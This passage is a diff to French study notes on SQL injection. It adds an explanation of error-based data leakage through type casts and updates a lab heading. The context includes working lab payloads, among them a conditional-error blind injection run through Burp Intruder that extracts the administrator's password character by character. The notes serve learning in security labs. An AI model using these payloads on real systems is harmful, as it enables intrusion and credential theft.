@@ -77,7 +77,10 @@ statut: en cours
 ```sql
 CAST((SELECT example_column FROM example_table) AS int)
 ```
-- Mécanisme: la donnée ciblée est très souvent une chaîne. La convertir en un type incompatibl
+- Mécanisme: la donnée ciblée est très souvent une chaîne. La convertir en un type incompatible, déclenche très souvent une erreur qui affiche cette valeur:
+```sql
+ERROR: invalid input syntax for type integer: "Example data"
+```
 
 
 ### MySQL et MariaDB
@@ -200,7 +203,7 @@ La démarche de détection (apostrophes, `FROM dual`, table inexistante) est dé
 5. Extraction caractère par caractère avec Burp Intruder : `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`, liste simple `a` à `z` et `0` à `9`. Le code 500 repère le bon caractère ; changer l'offset (`SUBSTR(password,2,1)`, etc.) pour chaque position. Détails d'Intruder dans [[Blind-SQL-injection]].
 6. Se connecter en tant que `administrator` via "My account" avec le mot de passe trouvé.
 
-### Visible error-based SQL injection (niveau Practitioner, non réalisé)
+### Visible error-based SQL injection
 Lab de référence de la famille verbeuse : le cookie `TrackingId` est injectable et le message d'erreur SQL est affiché. Déroulé attendu, à valider lors de la réalisation du lab (le SGBD attendu est PostgreSQL)
 1. Ajouter `'` et observer l'erreur SQL affichée.
 2. Tester `' AND CAST((SELECT 1) AS int)-- ` : le message indique que `AND` attend un booléen.
